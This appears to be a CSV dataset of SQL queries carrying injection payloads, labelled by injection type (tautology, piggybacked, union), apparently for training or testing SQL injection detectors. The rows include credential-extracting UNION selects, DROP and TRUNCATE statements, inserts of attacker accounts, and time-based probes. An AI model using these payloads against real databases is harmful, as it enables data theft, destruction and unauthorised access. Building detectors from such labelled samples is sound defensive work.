SQL Query,Illegal/Logically Incorrect Query,PiggyBacked Query,Union Query
"SELECT * FROM profiles WHERE ID = ''union select all 1,2,x,x,x,x --'",1,0,1
SELECT * from username where type = ' a' or 'a' = 'a',1,0,0
SELECT * FROM users WHERE name=' a' or 1=1--' and password='',1,0,0
SELECT * FROM product WHERE PCategory=''',1,0,0
SELECT * FROM students WHERE username = ' '' ' AND password = '',1,0,0
SELECT * from test.members where user_name=' \\'; DESC users; -- ' and password='';,1,1,0
SELECT * FROM students WHERE username = ' ' or 'x'='x' AND password = '',1,0,0
"SELECT * FROM newsletter WHERE email = ' ' or (1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = \'U\') -- '",1,0,1
SELECT id FROM Users WHERE username = ' ' or 'a'='a',1,0,0
"SELECT * FROM custTable WHERE User=''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students(StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--' OR 1=1'-- AND Pass=?",1,1,0
SELECT * FROM customers WHERE username = ''; TRUNCATE TABLE Username; --' and password = '',1,1,0
SELECT * FROM custTable WHERE User=' ' or 0=0 --' OR 1=1'-- AND Pass=?,1,0,0
SELECT * from username where type = ''; TRUNCATE TABLE Username; --',1,1,0
SELECT data FROM table WHERE Emailinput = ' 'sqlvuln',1,0,0
SELECT * FROM customers WHERE username = ' ' or 0=0 --' and password = '',1,0,0
SELECT * FROM users WHERE name='' and 1 = any (select 1 from users where FULL_NAME like โ€%%dministratorโ€ and rownum<=1 and PASSWORD like โ€0%โ€) and โ€1%%โ€=โ€1' and password='',1,0,0
SELECT * FROM newsletter WHERE email = ''; DROP table Username --',1,1,0
SELECT * FROM profiles WHERE ID = ' ' or 'a'='a',1,0,0
SELECT * FROM users WHERE name=''or 1=1; UPDATE Grades SET grade='attacker grade' WHERE studentId=attacker studentid;--' and password='',1,1,0
"SELECT user_name,password from test.members where user_name= ' ' or (1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116)-- '",1,0,0
SELECT * from user where id =''; DROP table Username --',1,1,0
SELECT data FROM table WHERE Emailinput = '' union select password from users --',1,0,1
SELECT * from username where type = ' '%31%27%20%4F%52%20%27%31%27%3D%27%31',1,0,0
SELECT * from test.members where user_name='' union select password from users --' and password='';,1,1,1
"SELECT * FROM customers WHERE username = ' ' or (1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=\'U\'), 1, 1))) > 116)-- ' and password = ''",1,0,0
"SELECT * from test.members where user_name='ddd' union select username,password from students --'",1,0,1
SELECT * from user where id =' a' or 'a' = 'a',1,0,0
"SELECT * FROM 'news' WHERE 'id' = ''; INSERT into Username (username, password, user_type) value('admin2', 'admin2', '1'); --' ORDER BY 'id' DESC LIMIT 0,3",1,1,0
SELECT * FROM profiles WHERE ID = ' a' or 'a' = 'a',1,0,0
SELECT * from table where username = ' 1' AND non_existant_table = '1 ' and password = '',1,0,0
SELECT * FROM product WHERE PCategory=' '' ',1,0,0
SELECT * FROM users WHERE username = ' ' 1 AND 1=1-- ',1,0,0
SELECT * FROM profiles WHERE ID = ' '; UPDATE table SET email = 'hacker@ymail.com' WHERE email = 'joe@ymail.com-- ',1,1,0
"SELECT user_name,password from test.members where user_name= ''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students (StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--'",1,1,0
SELECT * FROM students WHERE username = ''' AND password = '',1,0,0
"SELECT * from table where username = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR""*/' and password = ''",1,0,0
"SELECT * FROM 'news' WHERE 'id' = ' a' or 'a' = 'a' ORDER BY 'id' DESC LIMIT 0,3",1,0,0
"SELECT data FROM table WHERE Emailinput = ''union select all 1,2,x,x,x,x --'",1,0,1
SELECT * FROM custTable WHERE User=' ' 1 OR 1=1-- ' OR 1=1'-- AND Pass=?,1,0,0
"SELECT * FROM newsletter WHERE email = ''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students (StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--'",1,1,0
SELECT * FROM profiles WHERE ID = ''or 1=1; UPDATE Grades SET grade='attacker grade' WHERE studentId=attacker studentid;--',1,1,0
"SELECT user_name,password from test.members where user_name= ' a' or 'a' = 'a'",1,0,0
SELECT * from username where type = ' '; UPDATE table SET email = 'hacker@ymail.com' WHERE email = 'joe@ymail.com-- ',1,1,0
"SELECT * from test.members where user_name='""""' and password='';",1,1,0
"SELECT * FROM students WHERE username = ''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students (StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--' AND password = ''",1,1,0
"SELECT email from users where email = ''or 1=1; SET IDENTITY_INSERT Students ON INSERT INTO Students (StudentID, Username, Password) VALUES (attacker studentid, 'attacker username','attacker password');--'",1,1,0
SELECT * FROM custTable WHERE User='ddd' group by (studentid)--' OR 1=1'-- AND Pass=?,1,0,0
SELECT * from table where username = ' \\'; DESC users; -- ' and password = '',1,1,0
"SELECT 1,2, ' or a=a-- FROM some_table WHERE ex = ample",1,0,0
"SELECT * FROM custTable WHERE User='ddd' union select username,password from students --' OR 1=1'-- AND Pass=?",1,0,1
